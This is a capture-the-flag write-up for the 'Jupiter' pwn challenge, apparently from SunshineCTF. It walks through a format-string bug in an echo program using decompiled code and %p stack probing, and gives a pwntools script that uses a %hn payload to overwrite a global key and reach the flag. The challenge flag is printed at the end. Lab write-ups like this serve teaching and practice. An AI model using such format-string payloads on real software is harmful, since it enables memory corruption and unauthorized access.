# Jupiter

```
Jupiter just announced their new Brightline junction... the ECHO TERMINAL!!!

    jupiter

nc chal.sunshinectf.games 25607 
```

Decompile in IDA:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD buf[12]; // [rsp+0h] [rbp-60h] BYREF

  buf[11] = __readfsqword(0x28u);
  memset(buf, 0, 88);
  printf("Welcome to Jupiter's echo terminal\nEnter data at your own risk: ");
  read(0, buf, 0x57u);
  dprintf(2, (const char *)buf);
  if ( secret_key == 0x1337C0DE )
    read_flag();
  return 0;
}
```

The secret_key is located at `0x404010` with inital value of `0x0BADC0DE`:

```
.data:0000000000404010                 public secret_key
.data:0000000000404010 secret_key      dd 0BADC0DEh            ; DATA XREF: main+B3↑r
.data:0000000000404010 _data           ends
.data:0000000000404010
```

To get flag, we need to set `secret_key` to `0x1337C0DE`, se we need to write 2 bytes `0x1337` to `0x404012`, which is the higher 2 bytes of `secret_key`.

Next, we use the printf vulnerability to do the write. First, we identify the format string placement on the stack

```shell
$ ./jupiter
Welcome to Jupiter's echo terminal
Enter data at your own risk: %p%p%p%p%p%p%p%p
0x110xc(nil)(nil)0x70257025702570250x70257025702570250xa(nil)
```

From the fifth parameter, the format string becomes the parameter. So to write `0x1337`, we can:

1. write `0x1337` chars
2. write the number of printed chars (which is exactly `0x1337`) to the address specified by 7th parameter (starting from `&buf[16]`)
3. place the address `0x404012` to where the 7th parameter resides

Attack script:

```python
from pwn import *

elf = ELF("./jupiter")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

# secret_key at 0x404010
# 0x0BADC0DE -> 0x1337C0DE
# write 0x1337 to 0x404012
p = remote("chal.sunshinectf.games", 25607)
# p = process(["./jupiter"])
# gdb.attach(p)
# pause()
p.sendline(f"%{0x1337}c%7$hn".encode() + b"A" * 5 + p64(0x404012))
p.interactive()
```

Flag: `sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}`.
